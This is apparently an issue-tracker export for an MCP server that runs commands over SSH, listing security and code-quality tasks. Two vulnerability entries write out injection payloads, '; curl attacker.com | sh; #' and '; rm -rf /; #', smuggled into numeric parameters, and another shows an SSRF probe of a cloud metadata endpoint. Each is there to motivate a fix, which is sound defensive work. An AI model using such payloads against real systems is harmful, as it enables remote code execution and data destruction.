{"id":"scout_mcp-01v","title":"Replace Broad Exception Catches","description":"**MEDIUM PRIORITY - Error Handling**\n\n38 instances of `except Exception:` that are too broad and hide specific errors.\n\n**Pattern:**\n```python\nexcept Exception as e:\n    logger.error(\"Something failed: %s\", e)\n```\n\n**Issues:**\n- Catches unexpected exceptions (KeyboardInterrupt, SystemExit)\n- Makes debugging harder\n- Hides specific error types\n\n**Fix:** Use specific exception types:\n```python\n# Instead of:\nexcept Exception as e:\n\n# Use specific types:\nexcept asyncssh.Error as e:\n    # SSH-specific handling\nexcept OSError as e:\n    # OS-specific handling\nexcept (ValueError, KeyError) as e:\n    # Validation errors\n```\n\n**Locations:** Throughout codebase, especially in:\n- `services/pool.py`\n- `services/executors.py`\n- `middleware/errors.py`\n- `resources/*.py`\n\n**Effort:** 4 hours","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.272984366-05:00","updated_at":"2025-12-03T23:01:10.272984366-05:00","labels":["code-quality","error-handling","week-3"]}
{"id":"scout_mcp-04i","title":"CRITICAL: Fix command injection in docker_logs() tail parameter","description":"**CRITICAL SECURITY VULNERABILITY**\n\nUnvalidated `tail` parameter in docker_logs() allows shell command injection.\n\n**Location:** `scout_mcp/services/executors.py:231`\n\n**Vulnerable Code:**\n```python\ncmd = f\"docker logs --tail {tail} {ts_flag} {shlex.quote(container)} 2\u003e\u00261\"\n#                           ^^^^\n#                           NOT VALIDATED!\n```\n\n**Attack Vector:**\n```python\nawait docker_logs(conn, \"test\", tail=\"; curl attacker.com | sh; #\")\n# Executes: docker logs --tail ; curl attacker.com | sh; # ...\n```","design":"Same validation pattern as run_command():\n\n```python\nasync def docker_logs(..., tail: int = 100) -\u003e str:\n    if not isinstance(tail, int) or tail \u003c 0:\n        raise ValueError(f\"tail must be a non-negative integer, got {tail!r}\")\n    \n    cmd = f\"docker logs --tail {tail} {ts_flag} {shlex.quote(container)} 2\u003e\u00261\"\n    ...\n```","acceptance_criteria":"- [ ] Test rejects malicious tail parameter\n- [ ] Test rejects negative tail\n- [ ] Test accepts zero and positive integers\n- [ ] Existing docker_logs tests still pass","status":"open","priority":1,"issue_type":"bug","created_at":"2025-12-09T16:08:24.027487767-05:00","updated_at":"2025-12-09T16:08:24.027487767-05:00"}
{"id":"scout_mcp-0wx","title":"Implement API Key Authentication","description":"**CRITICAL SECURITY (CVSS 9.8)**\n\nNo authentication on MCP interface (HTTP or STDIO). Anyone with network access can execute arbitrary commands on remote hosts.\n\n**Location:** `scout_mcp/server.py`\n\n**Current Code:**\n```python\nmcp = FastMCP(\"scout_mcp\")  # No auth\n```\n\n**Fix:**\n```python\nfrom fastmcp.auth import APIKeyAuth\nmcp = FastMCP(\n    \"scout_mcp\",\n    auth=APIKeyAuth(api_keys=os.getenv(\"SCOUT_API_KEYS\", \"\").split(\",\"))\n)\n```\n\n**Impact:** Complete unauthorized access to all SSH hosts without this fix.","status":"closed","priority":1,"issue_type":"feature","created_at":"2025-12-03T22:58:54.962959149-05:00","updated_at":"2025-12-03T23:24:13.122816935-05:00","closed_at":"2025-12-03T23:24:13.122816935-05:00","labels":["critical","security","week-1"]}
{"id":"scout_mcp-1bo","title":"Add Output Size Limits for Commands and Directories","description":"**LOW PRIORITY - Resource Protection**\n\nDirectory listings and command outputs have no size limits and can exhaust memory.\n\n**Current:** Only file size has limit (1MB default)\n\n**Fix:** Add output size limits:\n```python\nMAX_OUTPUT_SIZE = int(os.getenv(\"SCOUT_MAX_OUTPUT_SIZE\", str(5 * 1024 * 1024)))  # 5MB\n\ndef truncate_output(output: str, max_size: int = MAX_OUTPUT_SIZE) -\u003e str:\n    if len(output) \u003e max_size:\n        return output[:max_size] + f\"\\n... [truncated, {len(output) - max_size} bytes omitted]\"\n    return output\n```\n\n**Apply to:**\n- Command execution results\n- Directory listings\n- Log file contents\n\n**Configuration:**\n```\nSCOUT_MAX_OUTPUT_SIZE=5242880  # 5MB\n```\n\n**Effort:** 2 hours","status":"open","priority":3,"issue_type":"feature","created_at":"2025-12-03T23:02:02.484252724-05:00","updated_at":"2025-12-03T23:02:02.484252724-05:00","labels":["reliability","resource-protection"]}
{"id":"scout_mcp-2k9","title":"Remove Empty prompts/ Directory","description":"**LOW PRIORITY - Cleanup**\n\nEmpty `prompts/` directory exists but has no content.\n\n**Location:** `scout_mcp/prompts/`\n\n**Options:**\n1. Remove the empty directory\n2. Implement MCP prompts if planned\n\n**Effort:** 5 minutes","status":"open","priority":3,"issue_type":"chore","created_at":"2025-12-03T23:02:02.357112288-05:00","updated_at":"2025-12-03T23:02:02.357112288-05:00","labels":["cleanup"]}
{"id":"scout_mcp-2rf","title":"Extract Connection Retry Helper","description":"**HIGH PRIORITY - Code Duplication**\n\nConnection retry pattern is duplicated 7+ times across the codebase (~150 lines).\n\n**Locations:**\n- `scout_mcp/tools/scout.py:76-95`\n- `scout_mcp/resources/scout.py:43-65`\n- `scout_mcp/resources/docker.py:31-41`\n- `scout_mcp/resources/docker.py:81-90`\n- `scout_mcp/resources/compose.py:28-37`\n- `scout_mcp/resources/zfs.py:35-44`\n- Multiple other resource files\n\n**Duplicated Pattern:**\n```python\ntry:\n    conn = await pool.get_connection(ssh_host)\nexcept Exception as first_error:\n    logger.warning(\"Connection failed: %s, retrying\", first_error)\n    try:\n        await pool.remove_connection(ssh_host.name)\n        conn = await pool.get_connection(ssh_host)\n    except Exception as retry_error:\n        raise SomeError(f\"Cannot connect: {retry_error}\") from retry_error\n```\n\n**Fix:** Create `scout_mcp/services/connection.py`:\n```python\nasync def get_connection_with_retry(\n    ssh_host: SSHHost,\n    logger: logging.Logger | None = None,\n) -\u003e asyncssh.SSHClientConnection:\n    \"\"\"Get SSH connection with automatic one-time retry on failure.\"\"\"\n    pool = get_pool()\n    try:\n        return await pool.get_connection(ssh_host)\n    except Exception as first_error:\n        logger.warning(\"Connection to %s failed, retrying\", ssh_host.name)\n        await pool.remove_connection(ssh_host.name)\n        return await pool.get_connection(ssh_host)\n```\n\n**Impact:** Eliminates ~150 lines of duplication\n**Effort:** 2 hours","status":"closed","priority":1,"issue_type":"task","created_at":"2025-12-03T23:00:01.738200005-05:00","updated_at":"2025-12-04T03:57:10.410748343-05:00","closed_at":"2025-12-04T03:57:10.410748343-05:00","labels":["code-quality","refactoring","week-2"]}
{"id":"scout_mcp-4ih","title":"Rename 'tree' Parameter to 'show_tree'","description":"**LOW PRIORITY - Naming Convention**\n\nBoolean parameter `tree` should follow `is_*`/`has_*`/`show_*` naming convention.\n\n**Location:** `scout_mcp/tools/scout.py`\n\n**Current:**\n```python\nasync def scout(target: str, query: str | None = None, tree: bool = False) -\u003e str:\n```\n\n**Fix:**\n```python\nasync def scout(target: str, query: str | None = None, show_tree: bool = False) -\u003e str:\n```\n\n**Effort:** 15 minutes","status":"open","priority":3,"issue_type":"chore","created_at":"2025-12-03T23:02:02.299316034-05:00","updated_at":"2025-12-03T23:02:02.299316034-05:00","labels":["code-quality","naming"]}
{"id":"scout_mcp-5e4","title":"Add CI/CD Pipeline with GitHub Actions","description":"**MEDIUM PRIORITY - DevOps**\n\nNo CI/CD pipeline exists. No automated testing, linting, or security scanning.\n\n**Deliverables:**\n\n1. **Pre-commit hooks** (`.pre-commit-config.yaml`):\n   - Ruff linting\n   - mypy type checking\n   - pytest execution\n\n2. **GitHub Actions workflow** (`.github/workflows/ci.yml`):\n   - Python 3.11+ matrix testing\n   - Ruff linting step\n   - mypy type checking step\n   - pytest with coverage\n   - Coverage reporting\n\n3. **Security scanning** (`.github/workflows/security.yml`):\n   - pip-audit for dependency CVEs\n   - bandit for code security issues\n   - trivy for container scanning\n\n**Example workflow:**\n```yaml\nname: CI\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: astral-sh/setup-uv@v4\n      - run: uv sync\n      - run: uv run ruff check .\n      - run: uv run mypy scout_mcp/\n      - run: uv run pytest --cov\n```\n\n**Effort:** 4 hours","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.290236918-05:00","updated_at":"2025-12-03T23:01:10.290236918-05:00","labels":["ci-cd","devops","week-3"]}
{"id":"scout_mcp-6ce","title":"Add Security Warnings to README","description":"**CRITICAL DOCUMENTATION**\n\nUsers may deploy without understanding security risks. Security warnings are completely missing from user-facing documentation.\n\n**Missing warnings for:**\n- No authentication on MCP interface\n- SSH host key verification disabled\n- Command injection risks\n- Default 0.0.0.0 binding implications\n\n**Deliverables:**\n1. Add prominent security warning section to README.md\n2. Create SECURITY.md with threat model\n3. Document required security measures before deployment\n\n**Effort:** 4 hours","status":"closed","priority":1,"issue_type":"task","created_at":"2025-12-03T22:58:55.010083333-05:00","updated_at":"2025-12-04T03:57:18.794635125-05:00","closed_at":"2025-12-04T03:57:18.794635125-05:00","labels":["critical","documentation","security","week-1"],"dependencies":[{"issue_id":"scout_mcp-6ce","depends_on_id":"scout_mcp-7di","type":"related","created_at":"2025-12-03T23:02:09.646090237-05:00","created_by":"daemon"},{"issue_id":"scout_mcp-6ce","depends_on_id":"scout_mcp-0wx","type":"related","created_at":"2025-12-03T23:02:09.653738559-05:00","created_by":"daemon"}]}
{"id":"scout_mcp-6ea","title":"Consider Dependency Injection Pattern","description":"**MEDIUM PRIORITY - Architecture**\n\nGlobal singleton pattern in `services/state.py` creates tight coupling and testing friction.\n\n**Location:** `scout_mcp/services/state.py`\n\n**Current Pattern:**\n```python\n_config: Config | None = None\n_pool: ConnectionPool | None = None\n\ndef get_config() -\u003e Config:\n    global _config\n    if _config is None:\n        _config = Config()\n    return _config\n```\n\n**Issues:**\n- Hidden dependencies throughout codebase\n- Testing requires `reset_state()` calls\n- Hard to mock for unit tests\n- Violates Dependency Inversion Principle\n\n**Note:** This is documented as an intentional design choice. Consider whether the benefits of DI outweigh migration cost.\n\n**Alternative (if pursued):**\n```python\n# Using dependency injection\nclass ScoutService:\n    def __init__(self, config: Config, pool: ConnectionPool):\n        self.config = config\n        self.pool = pool\n\n# Or using FastAPI-style Depends\nasync def scout(\n    target: str,\n    config: Config = Depends(get_config),\n    pool: ConnectionPool = Depends(get_pool),\n) -\u003e str:\n    ...\n```\n\n**Effort:** 8 hours (if changed)\n**Status:** Evaluate trade-offs before implementation","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.334312356-05:00","updated_at":"2025-12-03T23:01:10.334312356-05:00","labels":["architecture","discussion"]}
{"id":"scout_mcp-75w","title":"Add SSRF Prevention for Internal Services","description":"**LOW PRIORITY - Security Hardening**\n\nPotential SSRF vulnerability - can target internal services like AWS metadata endpoint.\n\n**Risk:** Attacker could use SSH hosts to access internal network services\n\n**Example Attack:**\n```\nscout(\"malicious-host:/latest/meta-data/\")  # Could access AWS metadata\n```\n\n**Fix:** Add IP range blocking for internal addresses:\n```python\nimport ipaddress\n\nBLOCKED_RANGES = [\n    ipaddress.ip_network(\"169.254.0.0/16\"),   # Link-local (AWS metadata)\n    ipaddress.ip_network(\"127.0.0.0/8\"),       # Localhost\n    ipaddress.ip_network(\"10.0.0.0/8\"),        # Private Class A\n    ipaddress.ip_network(\"172.16.0.0/12\"),     # Private Class B\n    ipaddress.ip_network(\"192.168.0.0/16\"),    # Private Class C\n]\n\ndef is_internal_ip(ip: str) -\u003e bool:\n    try:\n        addr = ipaddress.ip_address(ip)\n        return any(addr in network for network in BLOCKED_RANGES)\n    except ValueError:\n        return False\n```\n\n**Note:** May require allowlist for legitimate internal hosts\n\n**Effort:** 3 hours","status":"open","priority":3,"issue_type":"feature","created_at":"2025-12-03T23:02:02.450723045-05:00","updated_at":"2025-12-03T23:02:02.450723045-05:00","labels":["hardening","security"]}
{"id":"scout_mcp-7di","title":"Enable SSH Host Key Verification","description":"**CRITICAL SECURITY (CVSS 9.1)**\n\nCurrently `known_hosts=None` in pool.py:67 disables SSH host key verification, making the system vulnerable to Man-in-the-Middle attacks.\n\n**Location:** `scout_mcp/services/pool.py:67`\n\n**Current Code:**\n```python\nconn = await asyncssh.connect(\n    host.hostname,\n    known_hosts=None,  # VULNERABLE\n)\n```\n\n**Fix:**\n```python\nconn = await asyncssh.connect(\n    host.hostname,\n    known_hosts=str(Path.home() / \".ssh\" / \"known_hosts\"),\n)\n```\n\n**Related CVE:** CVE-2023-46446 (AsyncSSH Rogue Session Attack)","status":"closed","priority":1,"issue_type":"bug","created_at":"2025-12-03T22:58:54.938382198-05:00","updated_at":"2025-12-04T03:57:10.396433382-05:00","closed_at":"2025-12-04T03:57:10.396433382-05:00","labels":["critical","security","week-1"]}
{"id":"scout_mcp-82l","title":"Add Connection Pool Size Limits","description":"**HIGH PRIORITY - Resource Exhaustion**\n\nNo `max_size` limit allows unlimited connections, risking file descriptor and memory exhaustion (DoS vector).\n\n**Location:** `scout_mcp/services/pool.py`\n\n**Issue:** Connection pool has no maximum size limit. Can create unlimited connections to different hosts.\n\n**Fix:** Add configurable max pool size with LRU eviction:\n```python\nclass ConnectionPool:\n    def __init__(self, max_size: int = 100):\n        self._max_size = max_size\n        self._connections: OrderedDict[str, PooledConnection] = OrderedDict()\n    \n    async def get_connection(self, host: SSHHost) -\u003e asyncssh.SSHClientConnection:\n        # Evict LRU if at capacity\n        while len(self._connections) \u003e= self._max_size:\n            oldest_key = next(iter(self._connections))\n            await self.remove_connection(oldest_key)\n        # ... rest of logic\n```\n\n**Environment Variable:**\n```\nSCOUT_MAX_POOL_SIZE=100\n```\n\n**Effort:** 4 hours","status":"closed","priority":1,"issue_type":"feature","created_at":"2025-12-03T23:00:01.799897698-05:00","updated_at":"2025-12-04T03:57:18.838171154-05:00","closed_at":"2025-12-04T03:57:18.838171154-05:00","labels":["performance","security","week-4"]}
{"id":"scout_mcp-85e","title":"CRITICAL: Enforce SSH host key verification by default","description":"**CRITICAL SECURITY VULNERABILITY - MITM ATTACK VECTOR**\n\nSSH host key verification silently disabled when known_hosts file missing.\n\n**Current Unsafe Behavior:**\n```python\n# config.py - Defaults to None!\nknown_hosts_path: str | None = None\n\n# pool.py - Just logs warning, doesn't fail\nif self._known_hosts is None:\n    logger.warning(\"SSH host key verification DISABLED - vulnerable to MITM\")\n```\n\n**Impact:** Man-in-the-middle attacks possible by default\n\n**Required Fix:**\n1. Default to `~/.ssh/known_hosts` instead of None\n2. Fail in strict mode if known_hosts file doesn't exist\n3. Allow explicit opt-out via env var for testing only","design":"**New Defaults:**\n\n```python\n# config.py\nknown_hosts_path: Path = field(\n    default_factory=lambda: Path.home() / \".ssh\" / \"known_hosts\"\n)\nstrict_host_key_checking: bool = True\n```\n\n**Environment Variables:**\n- `SCOUT_KNOWN_HOSTS` - Path to known_hosts (or \"none\" to disable)\n- `SCOUT_STRICT_HOST_KEY_CHECKING` - Enforce strict checking (default: true)\n\n**Pool Validation:**\n```python\nif self._strict_host_key and self._known_hosts:\n    if not Path(self._known_hosts).exists():\n        raise ValueError(f\"known_hosts file not found: {self._known_hosts}\")\n```","acceptance_criteria":"- [ ] Config defaults to ~/.ssh/known_hosts\n- [ ] Pool raises error if file missing in strict mode\n- [ ] Pool allows missing file in non-strict mode\n- [ ] Environment variables work correctly\n- [ ] Documentation updated\n- [ ] Migration guide for existing users","status":"open","priority":1,"issue_type":"bug","created_at":"2025-12-09T16:08:24.089607033-05:00","updated_at":"2025-12-09T16:08:24.089607033-05:00"}
{"id":"scout_mcp-8rs","title":"Add HTTP Security Headers","description":"**LOW PRIORITY - Security Hardening**\n\nNo security headers on HTTP responses.\n\n**Missing Headers:**\n- `X-Content-Type-Options: nosniff`\n- `X-Frame-Options: DENY`\n- `Content-Security-Policy`\n- `Strict-Transport-Security` (if HTTPS)\n- `X-XSS-Protection: 1; mode=block`\n\n**Fix:** Add security headers middleware:\n```python\nfrom starlette.middleware import Middleware\nfrom starlette.middleware.base import BaseHTTPMiddleware\n\nclass SecurityHeadersMiddleware(BaseHTTPMiddleware):\n    async def dispatch(self, request, call_next):\n        response = await call_next(request)\n        response.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n        response.headers[\"X-Frame-Options\"] = \"DENY\"\n        response.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n        return response\n```\n\n**Effort:** 1 hour","status":"open","priority":3,"issue_type":"feature","created_at":"2025-12-03T23:02:02.38034705-05:00","updated_at":"2025-12-03T23:02:02.38034705-05:00","labels":["hardening","security"]}
{"id":"scout_mcp-8zo","title":"Refactor Functions Exceeding 50-Line Limit","description":"**MEDIUM PRIORITY - Code Quality**\n\n19 functions exceed the 50-line limit, making them harder to test and maintain.\n\n**Violators (Top 5):**\n1. `scout()` - 128 lines → Split into handlers (separate issue)\n2. `scout_resource()` - 79 lines\n3. `zfs_overview_resource()` - 75 lines\n4. `_parse_ssh_config()` - 71 lines\n5. `zfs_datasets_resource()` - 69 lines\n\n**Additional functions to refactor:**\n- Multiple resource functions in docker.py, compose.py, zfs.py, syslog.py\n- Middleware handlers in logging.py and errors.py\n- Utility formatters in console.py\n\n**Approach:**\n1. Extract helper functions for repeated patterns\n2. Use early returns to reduce nesting\n3. Extract validation and formatting logic\n\n**Effort:** 8 hours total","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.18129694-05:00","updated_at":"2025-12-03T23:01:10.18129694-05:00","labels":["code-quality","refactoring","week-2"]}
{"id":"scout_mcp-9ga","title":"LOW: Rename 'tree' parameter to 'show_tree'","description":"**NAMING CONVENTION VIOLATION**\n\nBoolean parameter `tree` should follow `is_*`/`has_*`/`show_*` convention.\n\n**Location:** `scout_mcp/tools/scout.py`\n\n**Change:**\n```python\n# BEFORE:\nasync def scout(target: str, tree: bool = False) -\u003e str:\n\n# AFTER:\nasync def scout(target: str, show_tree: bool = False) -\u003e str:\n```\n\n**Breaking Change:** Yes","design":"**Migration Strategy:**\n1. Support both `tree` and `show_tree` in release N\n2. Log deprecation warning if `tree` used\n3. Remove `tree` in release N+1","acceptance_criteria":"- [ ] Parameter renamed\n- [ ] Documentation updated\n- [ ] Tests updated","status":"open","priority":3,"issue_type":"chore","created_at":"2025-12-09T16:08:24.237319082-05:00","updated_at":"2025-12-09T16:08:24.237319082-05:00"}
{"id":"scout_mcp-9na","title":"Extract Host Validation Helper","description":"**MEDIUM PRIORITY - Code Duplication**\n\nSame host validation code is repeated in 8+ resource files (~80 lines total).\n\n**Duplicated Pattern:**\n```python\nssh_host = config.get_host(host)\nif ssh_host is None:\n    available = \", \".join(sorted(config.get_hosts().keys()))\n    raise ResourceError(f\"Unknown host '{host}'. Available: {available}\")\n```\n\n**Locations:**\n- All resource files in `scout_mcp/resources/`\n\n**Fix:** Create `scout_mcp/utils/validation.py`:\n```python\nfrom fastmcp.exceptions import ResourceError\nfrom scout_mcp.models import SSHHost\nfrom scout_mcp.services import get_config\n\ndef validate_host(host: str) -\u003e SSHHost:\n    \"\"\"Validate host exists in SSH config.\n    \n    Raises:\n        ResourceError: If host not found\n    \"\"\"\n    config = get_config()\n    ssh_host = config.get_host(host)\n    if ssh_host is None:\n        available = \", \".join(sorted(config.get_hosts().keys()))\n        raise ResourceError(f\"Unknown host '{host}'. Available: {available}\")\n    return ssh_host\n```\n\n**Effort:** 1 hour","status":"in_progress","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.203771355-05:00","updated_at":"2025-12-08T12:34:05.640480648-05:00","labels":["code-quality","refactoring","week-2"]}
{"id":"scout_mcp-9z3","title":"Implement RBAC Authorization","description":"**CRITICAL SECURITY**\n\nNo authorization controls exist - any authenticated user can access any host and execute any command.\n\n**Requirements:**\n- Role-based access control (RBAC)\n- Roles: `readonly`, `developer`, `admin`\n- Per-host access restrictions\n- Command whitelisting for non-admin roles\n\n**Implementation:**\n```python\nfrom dataclasses import dataclass\nfrom enum import Enum\n\nclass Role(Enum):\n    READONLY = \"readonly\"      # Can only read files and list directories\n    DEVELOPER = \"developer\"    # Can execute whitelisted commands\n    ADMIN = \"admin\"            # Full access\n\n@dataclass\nclass UserPermissions:\n    role: Role\n    allowed_hosts: list[str] | None = None  # None = all hosts\n    allowed_commands: list[str] | None = None  # Regex patterns\n\nclass AuthorizationMiddleware(Middleware):\n    async def on_call_tool(self, context: MiddlewareContext, call_next):\n        user = context.auth_context.user\n        permissions = get_user_permissions(user.email)\n        \n        # Check host access\n        if not self._can_access_host(permissions, target_host):\n            raise ToolError(\"Access denied: no permission for this host\")\n        \n        # Check command permission\n        if query and not self._can_execute_command(permissions, query):\n            raise ToolError(\"Access denied: command not allowed\")\n        \n        return await call_next(context)\n```\n\n**Configuration:**\n```yaml\n# config/rbac.yaml\nroles:\n  readonly:\n    hosts: [\"prod-*\", \"staging-*\"]\n    commands: []  # No command execution\n  developer:\n    hosts: [\"dev-*\", \"staging-*\"]\n    commands: [\"ls\", \"cat\", \"grep\", \"find\", \"tree\"]\n  admin:\n    hosts: [\"*\"]\n    commands: [\"*\"]\n\nusers:\n  alice@company.com: admin\n  bob@company.com: developer\n  carol@company.com: readonly\n```\n\n**Effort:** 8 hours","status":"open","priority":1,"issue_type":"feature","created_at":"2025-12-03T23:24:06.508722359-05:00","updated_at":"2025-12-03T23:24:06.508722359-05:00","labels":["authorization","critical","security","week-1"],"dependencies":[{"issue_id":"scout_mcp-9z3","depends_on_id":"scout_mcp-vid","type":"blocks","created_at":"2025-12-03T23:24:13.140708762-05:00","created_by":"daemon"}]}
{"id":"scout_mcp-bmq","title":"CRITICAL: Fix command injection in run_command() timeout parameter","description":"**CRITICAL SECURITY VULNERABILITY**\n\nUnvalidated `timeout` parameter in run_command() allows shell command injection.\n\n**Location:** `scout_mcp/services/executors.py:178`\n\n**Vulnerable Code:**\n```python\nfull_command = f\"cd {shlex.quote(working_dir)} \u0026\u0026 timeout {timeout} {command}\"\n#                                                          ^^^^^^^\n#                                                          NOT VALIDATED!\n```\n\n**Attack Vector:**\n```python\nawait run_command(conn, \"/tmp\", \"echo pwned\", timeout=\"; rm -rf /; #\")\n# Executes: cd '/tmp' \u0026\u0026 timeout ; rm -rf /; # echo pwned\n```\n\n**Impact:** Remote command execution on SSH hosts\n\n**Fix:** Validate timeout is positive integer before use","design":"**Validation Strategy:**\n\n1. Add type checking: `if not isinstance(timeout, int) or timeout \u003c= 0`\n2. Raise ValueError with clear message\n3. Extract to reusable validation utility\n\n**Implementation:**\n```python\nasync def run_command(..., timeout: int) -\u003e CommandResult:\n    # Validate timeout is a safe integer\n    if not isinstance(timeout, int) or timeout \u003c= 0:\n        raise ValueError(f\"timeout must be a positive integer, got {timeout!r}\")\n    \n    # Safe: timeout is guaranteed to be a positive integer\n    full_command = f\"cd {shlex.quote(working_dir)} \u0026\u0026 timeout {timeout} {command}\"\n    ...\n```","acceptance_criteria":"**Test Coverage:**\n- [ ] Test rejects malicious timeout with shell metacharacters\n- [ ] Test rejects negative timeout\n- [ ] Test rejects zero timeout\n- [ ] Test accepts valid positive integer\n- [ ] Test works with existing functionality\n\n**Verification:**\n```bash\nuv run pytest tests/test_security.py::test_run_command_rejects_malicious_timeout -v\nuv run pytest tests/test_executors.py -v  # All existing tests still pass\nuv run mypy scout_mcp/services/executors.py --strict\n```\n\n**Success Criteria:**\n- Zero command injection vulnerabilities\n- All tests passing\n- Type hints enforced","status":"open","priority":1,"issue_type":"bug","created_at":"2025-12-09T16:08:23.991235701-05:00","updated_at":"2025-12-09T16:08:23.991235701-05:00"}
{"id":"scout_mcp-c96","title":"Add Request Timeout Middleware","description":"**LOW PRIORITY - Reliability**\n\nNo global request timeout to prevent long-running operations from blocking.\n\n**Current:** Individual command timeout exists, but no request-level timeout\n\n**Fix:** Add request timeout middleware:\n```python\nimport asyncio\nfrom starlette.middleware.base import BaseHTTPMiddleware\n\nREQUEST_TIMEOUT = int(os.getenv(\"SCOUT_REQUEST_TIMEOUT\", \"120\"))\n\nclass TimeoutMiddleware(BaseHTTPMiddleware):\n    async def dispatch(self, request, call_next):\n        try:\n            return await asyncio.wait_for(\n                call_next(request),\n                timeout=REQUEST_TIMEOUT\n            )\n        except asyncio.TimeoutError:\n            return JSONResponse(\n                {\"error\": \"Request timeout\"},\n                status_code=504\n            )\n```\n\n**Configuration:**\n```\nSCOUT_REQUEST_TIMEOUT=120\n```\n\n**Effort:** 2 hours","status":"open","priority":3,"issue_type":"feature","created_at":"2025-12-03T23:02:02.469765178-05:00","updated_at":"2025-12-03T23:02:02.469765178-05:00","labels":["middleware","reliability"]}
{"id":"scout_mcp-drx","title":"Add Rate Limiting Middleware","description":"**HIGH PRIORITY - Security**\n\nNo rate limiting allows API abuse and DoS attacks.\n\n**Impact:** Unbounded request rate can overwhelm system\n\n**Fix:** Add rate limiting middleware:\n```python\nfrom fastmcp.middleware import RateLimitMiddleware\n\nmcp = FastMCP(\n    \"scout_mcp\",\n    middleware=[\n        RateLimitMiddleware(\n            requests_per_minute=60,\n            requests_per_hour=1000,\n        ),\n        # ... other middleware\n    ]\n)\n```\n\n**Configuration:**\n```\nSCOUT_RATE_LIMIT_PER_MINUTE=60\nSCOUT_RATE_LIMIT_PER_HOUR=1000\n```\n\n**Effort:** 3 hours","status":"closed","priority":1,"issue_type":"feature","created_at":"2025-12-03T23:00:01.861779219-05:00","updated_at":"2025-12-04T03:57:18.770383853-05:00","closed_at":"2025-12-04T03:57:18.770383853-05:00","labels":["security","week-1"]}
{"id":"scout_mcp-efu","title":"Add Host Online Status Caching","description":"**LOW PRIORITY - Performance**\n\n`scout(\"hosts\")` command pings every host on each call, causing slow response times.\n\n**Current Behavior:** Every `scout(\"hosts\")` call pings all configured hosts\n\n**Impact:** Slow response for host listing (seconds per host)\n\n**Fix:** Cache online status with TTL:\n```python\nfrom functools import lru_cache\nfrom datetime import datetime, timedelta\n\nclass HostStatusCache:\n    def __init__(self, ttl_seconds: int = 60):\n        self._cache: dict[str, tuple[bool, datetime]] = {}\n        self._ttl = timedelta(seconds=ttl_seconds)\n    \n    def get_status(self, host: str) -\u003e bool | None:\n        if host in self._cache:\n            status, timestamp = self._cache[host]\n            if datetime.now() - timestamp \u003c self._ttl:\n                return status\n        return None\n    \n    def set_status(self, host: str, online: bool):\n        self._cache[host] = (online, datetime.now())\n```\n\n**Configuration:**\n```\nSCOUT_HOST_STATUS_TTL=60\n```\n\n**Estimated Speedup:** 2,000x for cached responses\n\n**Effort:** 2 hours","status":"open","priority":3,"issue_type":"feature","created_at":"2025-12-03T23:02:02.432545483-05:00","updated_at":"2025-12-03T23:02:02.432545483-05:00","labels":["caching","performance"]}
{"id":"scout_mcp-ep4","title":"Add Active Connection Health Checks","description":"**HIGH PRIORITY - Reliability**\n\nCurrent connection validation only checks `_transport is None`, which doesn't detect network issues or stale connections.\n\n**Location:** `scout_mcp/services/pool.py`\n\n**Current (Weak):**\n```python\nif conn._transport is None:  # Only checks if transport object exists\n    # Stale\n```\n\n**Fix - Add Active Health Check:**\n```python\nasync def _validate_connection(self, conn: asyncssh.SSHClientConnection) -\u003e bool:\n    \"\"\"Test if connection is alive with quick no-op command.\"\"\"\n    try:\n        result = await asyncio.wait_for(\n            conn.run('true', check=False),\n            timeout=2.0\n        )\n        return result.returncode == 0\n    except (asyncssh.Error, asyncio.TimeoutError, OSError):\n        return False\n\nasync def get_connection(self, host: SSHHost) -\u003e asyncssh.SSHClientConnection:\n    async with self._lock:\n        if host.name in self._connections:\n            pooled = self._connections[host.name]\n            conn = pooled.connection\n            \n            # Active health check before reuse\n            if not await self._validate_connection(conn):\n                logger.warning(\"Connection to %s failed health check, removing\", host.name)\n                await self._close_connection(host.name)\n            else:\n                pooled.last_used = datetime.now()\n                return conn\n        \n        # Create new connection...\n```\n\n**Configuration:**\n```bash\nSCOUT_HEALTH_CHECK_TIMEOUT=2  # seconds\nSCOUT_HEALTH_CHECK_ENABLED=true\n```\n\n**Trade-off:** Adds ~2ms latency per request for health check vs risk of stale connection errors\n\n**Effort:** 3 hours","status":"open","priority":1,"issue_type":"feature","created_at":"2025-12-03T23:24:06.529136544-05:00","updated_at":"2025-12-03T23:24:06.529136544-05:00","labels":["performance","reliability","week-2"]}
{"id":"scout_mcp-evh","title":"Implement ResourceRegistry Pattern","description":"**MEDIUM PRIORITY - Architecture**\n\n167 lines of repetitive closure factories in server.py (lines 195-361) for resource registration.\n\n**Location:** `scout_mcp/server.py:195-361`\n\n**Issue:** Adding new resource types requires modifying app_lifespan(). Open/Closed Principle violated.\n\n**Pattern being repeated:**\n```python\ndef make_docker_logs_handler(h: str) -\u003e Any:\n    async def handler(container: str) -\u003e str:\n        return await _read_docker_logs(h, container)\n    return handler\n```\n\n**Fix:** Implement ResourceRegistry:\n```python\n# scout_mcp/resources/registry.py\n@dataclass\nclass ResourceTemplate:\n    uri_pattern: str\n    name_template: str\n    description_template: str\n    mime_type: str\n    handler_factory: Callable[[str], Callable]\n\nclass ResourceRegistry:\n    def __init__(self):\n        self.templates: list[ResourceTemplate] = []\n    \n    def register_template(self, template: ResourceTemplate):\n        self.templates.append(template)\n    \n    def register_all_for_host(self, server: FastMCP, host: str):\n        for template in self.templates:\n            uri = template.uri_pattern.format(host=host)\n            # ... register with server\n```\n\n**Effort:** 6 hours","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.238740094-05:00","updated_at":"2025-12-03T23:01:10.238740094-05:00","labels":["architecture","refactoring","week-2"]}
